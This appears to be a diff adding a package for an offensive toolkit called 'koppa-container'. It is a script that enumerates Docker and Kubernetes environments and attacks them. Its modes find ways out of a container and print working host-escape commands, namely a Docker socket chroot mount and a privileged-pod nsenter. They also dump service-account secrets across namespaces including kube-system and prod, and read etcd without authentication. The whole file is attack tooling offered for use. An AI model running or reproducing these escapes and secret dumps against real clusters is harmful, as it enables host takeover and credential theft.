@@ -1,0 +1,121 @@
+## pkg: koppa-container
+## version: 1.0.0
+## desc: Docker/Kubernetes container escape and enumeration
+# Usage: koppa run koppa-container [check|escape-docker|k8s-enum|k8s-secrets|etcd]
+
+import container, log, report
+
+fn cmd_check() {
+    log.info("===== Container Escape Vector Check =====")
+    let is_cont = container.is_container()
+    if is_cont {
+        log.warn("[!] Running inside a container")
+    }
+    if not is_cont {
+        log.info("[*] Not in a container (or not detected)")
+    }
+    let vectors = container.docker_escape_check()
+    for v in vectors {
+        log.success("[+] ESCAPE VECTOR: {v}")
+    }
+    if not vectors {
+        log.info("[-] No obvious escape vectors found")
+    }
+    let sock = container.docker_socket()
+    if sock {
+        log.success("[+] Docker socket accessible — full escape possible!")
+    }
+}
+
+fn cmd_escape_docker() {
+    log.info("===== Docker Socket Escape =====")
+    let sock = container.docker_socket()
+    if not sock {
+        log.warn("[-] Docker socket not accessible at /var/run/docker.sock")
+        return
+    }
+    log.success("[+] Docker socket found!")
+    log.info("Containers:")
+    let conts = container.docker_api("/containers/json")
+    log.info("{conts}")
+    log.info("")
+    log.info("Escape command:")
+    let cmd = container.docker_escape_socket()
+    log.success(cmd)
+    log.info("")
+    log.info("Or: docker run -v /:/host --rm -it alpine chroot /host /bin/sh")
+}
+
+fn cmd_k8s_enum() {
+    log.info("===== Kubernetes Enumeration =====")
+    let token = container.k8s_token()
+    if token {
+        log.success("[+] Service account token found ({len(token)}b)")
+    }
+    if not token {
+        log.warn("[-] No K8s service account token found")
+        return
+    }
+    log.info("[*] Checking permissions...")
+    let perms = container.k8s_check_permissions(token)
+    log.info("{perms}")
+    log.info("")
+    log.info("[*] Listing pods...")
+    let pods = container.k8s_pods("default", token)
+    log.info("{pods}")
+}
+
+fn cmd_k8s_secrets() {
+    log.info("===== K8s Secrets Dump =====")
+    let token = container.k8s_token()
+    if not token {
+        log.warn("[-] No K8s token available")
+        return
+    }
+    let secrets = container.k8s_secrets("default", token)
+    log.info("{secrets}")
+    log.info("")
+    log.info("[*] Checking all namespaces...")
+    for ns in ["default", "kube-system", "kube-public", "prod", "staging"] {
+        let s = container.k8s_secrets(ns, token)
+        if s {
+            log.success("[+] Secrets in namespace: {ns}")
+            log.info("{s}")
+        }
+    }
+}
+
+fn cmd_etcd() {
+    log.info("===== etcd Unauthenticated Access =====")
+    for endpoint in ["http://127.0.0.1:2379", "http://localhost:2379"] {
+        let out = container.etcd_dump(endpoint)
+        if out {
+            log.success("[+] etcd accessible at {endpoint}")
+            log.info("{out}")
+        }
+    }
+}
+
+fn cmd_k8s_escape() {
+    log.info("===== K8s Privileged Pod Escape =====")
+    let yaml = container.k8s_escape()
+    log.success("[+] Apply this YAML to escape to host:")
+    log.info(yaml)
+    log.info("Then: kubectl exec -it koppa-escape -- nsenter -t 1 -m -u -i -n /bin/sh")
+}
+
+fn main() {
+    let mode = __args__[0]
+    log.info("===== KOPPA Container Security v1.0 =====")
+    if not mode {
+        log.warn("Usage: koppa run koppa-container [check|escape-docker|k8s-enum|k8s-secrets|k8s-escape|etcd]")
+        return
+    }
+    if mode == "check"         { cmd_check() }
+    if mode == "escape-docker" { cmd_escape_docker() }
+    if mode == "k8s-enum"      { cmd_k8s_enum() }
+    if mode == "k8s-secrets"   { cmd_k8s_secrets() }
+    if mode == "k8s-escape"    { cmd_k8s_escape() }
+    if mode == "etcd"          { cmd_etcd() }
+    log.success("Done!")
+}
